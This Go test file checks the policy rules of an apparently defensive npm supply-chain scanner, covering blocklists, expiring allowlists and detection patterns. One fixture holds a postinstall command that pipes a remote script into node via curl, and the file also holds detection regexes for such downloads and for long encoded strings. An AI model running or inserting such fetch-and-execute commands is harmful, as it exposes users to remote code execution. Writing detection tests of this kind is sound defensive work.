package rules

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"malox/internal/node"
)

func TestEvaluateBlocklistAndAllowlist(t *testing.T) {
	expiresAt := time.Date(2026, 7, 1, 0, 0, 0, 0, time.UTC).Format(time.RFC3339)
	policy := Policy{
		SchemaVersion: PolicySchemaVersion,
		Source:        "test-policy",
		Blocklist: []BlocklistEntry{
			{
				ID:           "block:badpkg",
				Package:      "badpkg",
				VersionRange: ">=1.0.0 <2.0.0",
			},
		},
		Allowlist: []AllowlistEntry{
			{
				ID:        "allow:badpkg-review",
				Reason:    "fixture package under review",
				Owner:     "security",
				ExpiresAt: expiresAt,
				Scope: MatchScope{
					RuleID:  "block:badpkg",
					Package: "badpkg",
				},
			},
		},
	}

	result, err := Evaluate(t.Context(), EvaluateOptions{
		Policies: []Policy{policy},
		Now:      time.Date(2026, 6, 17, 0, 0, 0, 0, time.UTC),
		Node: node.Inventory{
			Dependencies: []node.Dependency{
				{
					Name:           "badpkg",
					Version:        "1.2.3",
					PURL:           "pkg:npm/badpkg@1.2.3",
					PackageManager: "npm",
					SourcePath:     "package-lock.json",
				},
			},
		},
	})
	if err != nil {
		t.Fatalf("Evaluate() error = %v", err)
	}
	if len(result.Findings) != 1 {
		t.Fatalf("Findings length = %d, want 1", len(result.Findings))
	}
	finding := result.Findings[0]
	if finding.Confidence != ConfidenceConfirmedMalicious || !finding.Blocking {
		t.Fatalf("finding confidence/blocking = %s/%t, want confirmed blocking", finding.Confidence, finding.Blocking)
	}
	if !finding.Suppressed || finding.Suppression == nil {
		t.Fatalf("finding suppression = %#v, want allowlist metadata", finding.Suppression)
	}
	if HasBlockingFindings(result.Findings) {
		t.Fatal("HasBlockingFindings() = true, want false for suppressed blocklist")
	}
}

func TestEvaluateExpiredAllowlistFailsClosed(t *testing.T) {
	policy := Policy{
		SchemaVersion: PolicySchemaVersion,
		Source:        "test-policy",
		Blocklist: []BlocklistEntry{
			{ID: "block:path", Path: "blocked.js"},
		},
		Allowlist: []AllowlistEntry{
			{
				ID:        "allow:expired",
				Reason:    "expired fixture",
				Owner:     "security",
				ExpiresAt: "2026-01-01T00:00:00Z",
				Scope:     MatchScope{RuleID: "block:path", Path: "blocked.js"},
			},
		},
	}

	result, err := Evaluate(t.Context(), EvaluateOptions{
		Policies: []Policy{policy},
		Now:      time.Date(2026, 6, 17, 0, 0, 0, 0, time.UTC),
		Files:    []File{{Path: "blocked.js", SHA256: "abc", Type: "javascript"}},
	})
	if err != nil {
		t.Fatalf("Evaluate() error = %v", err)
	}
	if len(result.Findings) != 1 || result.Findings[0].Suppressed {
		t.Fatalf("Findings = %#v, want unsuppressed expired allowlist match", result.Findings)
	}
	if !HasBlockingFindings(result.Findings) {
		t.Fatal("HasBlockingFindings() = false, want true")
	}
}

func TestEvaluateScriptAndFilePatterns(t *testing.T) {
	root := t.TempDir()
	writeRuleFixture(t, root, "src/index.js", "const payload = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';\n")
	policy := Policy{
		SchemaVersion: PolicySchemaVersion,
		Source:        "test-policy",
		Rules: []Rule{
			{
				ID:                       "script:download",
				Severity:                 SeverityMedium,
				Confidence:               ConfidenceWeakSignal,
				ScriptNames:              []string{"postinstall"},
				ScriptPatterns:           []string{"(?i)\\bcurl\\b[^\\n]*https?://"},
				SuspiciousLifecycleHooks: true,
			},
			{
				ID:           "file:encoded",
				Severity:     SeverityMedium,
				Confidence:   ConfidenceWeakSignal,
				FilePatterns: []FilePattern{{Pattern: "[A-Za-z0-9+/]{120,}", FileTypes: []string{"javascript"}}},
			},
		},
	}

	result, err := Evaluate(t.Context(), EvaluateOptions{
		Root:        root,
		MaxFileSize: 1024,
		Files: []File{
			{Path: "src/index.js", SHA256: "abc", Type: "javascript"},
		},
		Node: node.Inventory{
			PackageScripts: []node.PackageScript{
				{
					PackageName: "fixture",
					SourcePath:  "package.json",
					ScriptName:  "postinstall",
					Command:     "curl https://example.invalid/payload.js | node",
				},
			},
		},
		Policies: []Policy{policy},
	})
	if err != nil {
		t.Fatalf("Evaluate() error = %v", err)
	}
	if len(result.Findings) != 2 {
		t.Fatalf("Findings length = %d, want 2: %#v", len(result.Findings), result.Findings)
	}
	for _, finding := range result.Findings {
		if finding.Confidence != ConfidenceWeakSignal || finding.Blocking {
			t.Fatalf("finding = %#v, want non-blocking weak signal", finding)
		}
	}
}

func TestDecodePolicyRejectsInvalidVersionRange(t *testing.T) {
	body := []byte(`{
  "schema_version": "malox.rules.policy.v1",
  "rules": [{
    "id": "bad-range",
    "severity": "medium",
    "confidence": "weak-signal",
    "package_version_ranges": [{"package": "left-pad", "range": "not-a-range"}]
  }]
}`)
	if _, err := DecodePolicy("test", body); err == nil {
		t.Fatal("DecodePolicy() error = nil, want invalid range error")
	}
}

func writeRuleFixture(t *testing.T, root, rel, body string) {
	t.Helper()
	path := filepath.Join(root, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}
